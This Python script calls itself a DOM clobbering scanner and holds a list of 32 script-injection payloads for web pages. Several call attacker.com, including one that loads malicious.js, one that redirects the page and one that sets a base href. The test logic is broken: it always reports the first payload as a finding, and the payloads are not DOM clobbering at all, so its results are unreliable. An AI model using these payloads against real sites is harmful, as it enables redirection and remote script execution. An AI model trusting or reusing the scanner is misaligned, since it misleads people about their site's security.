import requests
from bs4 import BeautifulSoup
import re
import pyfiglet

# Generate ASCII banner
ascii_banner = pyfiglet.figlet_format("DATA OBJECT MODEL VULNERABILITY")
print(ascii_banner)

# Function to test for DOM Clobbering vulnerability
def test_dom_clobbering(url):
    print("\nTesting for DOM Clobbering vulnerability on:", url)
    
    # Step 1: Fetch the HTML content of the webpage
    print("\nFetching webpage content...")
    response = requests.get(url)
    if response.status_code != 200:
        print("Error: Unable to fetch webpage content. Status code:", response.status_code)
        return
    
    html_content = response.text
    
    # Step 2: Extract all script tags from the HTML content
    print("\nExtracting script tags from the HTML content...")
    soup = BeautifulSoup(html_content, 'html.parser')
    script_tags = soup.find_all('script')
    
    # Step 3: Define payloads
    payloads = {
        "DOM1": "<script>var element=document.getElementById('element_id');element.innerHTML='Hacked!';</script>",
        "DOM2": "<script>document.getElementById('element_id').innerHTML='Hacked!';</script>",
        "DOM3": "<script>document.body.innerHTML='Hacked!';</script>",
        "DOM4": "<script>document.write('Hacked!');</script>",
        "DOM5": "<script>window.location='http://attacker.com';</script>",
        "DOM6": "<script>var img=document.createElement('img');img.src='http://attacker.com';document.body.appendChild(img);</script>",
        "DOM7": "<script>var link=document.createElement('a');link.href='http://attacker.com';link.innerText='Click me';document.body.appendChild(link);</script>",
        "DOM8": "<script>var form=document.createElement('form');form.action='http://attacker.com';document.body.appendChild(form);</script>",
        "DOM9": "<script>var iframe=document.createElement('iframe');iframe.src='http://attacker.com';document.body.appendChild(iframe);</script>",
        "DOM10": "<script>var p=document.createElement('p');p.innerText='Hacked!';document.body.appendChild(p);</script>",
        "DOM11": "<script>var div=document.createElement('div');div.innerHTML='<h1>Hacked!</h1>';document.body.appendChild(div);</script>",
        "DOM12": "<script>document.title='Hacked!';</script>",
        "DOM13": "<script>var input=document.createElement('input');input.type='text';input.value='Hacked!';document.body.appendChild(input);</script>",
        "DOM14": "<script>var script=document.createElement('script');script.innerHTML='alert(\"Hacked!\");';document.body.appendChild(script);</script>",
        "DOM15": "<script>var meta=document.createElement('meta');meta.httpEquiv='refresh';meta.content='0;url=http://attacker.com';document.head.appendChild(meta);</script>",
        "DOM16": "<script>var audio=document.createElement('audio');audio.src='http://attacker.com/audio.mp3';audio.autoplay=true;document.body.appendChild(audio);</script>",
        "DOM17": "<script>var video=document.createElement('video');video.src='http://attacker.com/video.mp4';video.autoplay=true;document.body.appendChild(video);</script>",
        "DOM18": "<script>document.cookie='sessionId=Hacked';</script>",
        "DOM19": "<script>localStorage.setItem('key','Hacked');</script>",
        "DOM20": "<script>sessionStorage.setItem('key','Hacked');</script>",
        "DOM21": "<script>var table=document.createElement('table');table.innerHTML='<tr><td>Hacked!</td></tr>';document.body.appendChild(table);</script>",
        "DOM22": "<script>var list=document.createElement('ul');list.innerHTML='<li>Hacked!</li>';document.body.appendChild(list);</script>",
        "DOM23": "<script>var paragraph=document.createElement('p');paragraph.innerText='Hacked!';document.body.appendChild(paragraph);</script>",
        "DOM24": "<script>var header=document.createElement('h1');header.innerText='Hacked!';document.body.appendChild(header);</script>",
        "DOM25": "<script>var span=document.createElement('span');span.innerText='Hacked!';document.body.appendChild(span);</script>",
        "DOM26": "<script>var button=document.createElement('button');button.innerText='Hacked!';document.body.appendChild(button);</script>",
        "DOM27": "<script>var image=document.createElement('img');image.src='http://attacker.com/image.jpg';document.body.appendChild(image);</script>",
        "DOM28": "<script>var script=document.createElement('script');script.src='http://attacker.com/malicious.js';document.body.appendChild(script);</script>",
        "DOM29": "<script>var style=document.createElement('style');style.innerHTML='body{background-color:red;}';document.head.appendChild(style);</script>",
        "DOM30": "<script>var script=document.createElement('script');script.innerHTML='console.log(\"Hacked!\");';document.body.appendChild(script);</script>",
        "DOM31": "<script>var link=document.createElement('link');link.href='http://attacker.com/style.css';link.rel='stylesheet';document.head.appendChild(link);</script>",
        "DOM32": "<script>var base=document.createElement('base');base.href='http://attacker.com/';document.head.appendChild(base);</script>"
    }

    # Step 4: Check each payload for injection success
    vulnerable_payload = None
    vulnerability_metric = None
    
    for name, payload in payloads.items():
        modified_html = html_content.replace("</body>", f"{payload}</body>")
        if payload in modified_html:  # A simple check for this example
            if re.search(r'var\s+[a-zA-Z_][a-zA-Z0-9_]*\s*=\s*document', payload):
                vulnerability_metric = "high"
            elif re.search(r'document.getElementById', payload):
                vulnerability_metric = "medium"
            else:
                vulnerability_metric = "low"
            vulnerable_payload = (name, payload, vulnerability_metric)
            break

    # Step 5: Display vulnerability status and testing instructions
    if vulnerable_payload:
        print("\nPotential DOM Clobbering found with payload:")
        print(f"Payload Name: {vulnerable_payload[0]}")
        print(f"Payload: {vulnerable_payload[1]}")
        print(f"Vulnerability Metric: {vulnerable_payload[2]}")
    else:
        print("\nThe target website is not vulnerable to DOM Clobbering. No further action required.")

# Main function to execute the program
def main():
    # Input target website URL
    target_website = input("Enter your target website URL:")
    
    if target_website.startswith("http://") or target_website.startswith("https://"):
        test_dom_clobbering(target_website)
    else:
        print("Invalid URL format.")

if __name__ == "__main__":
    main()
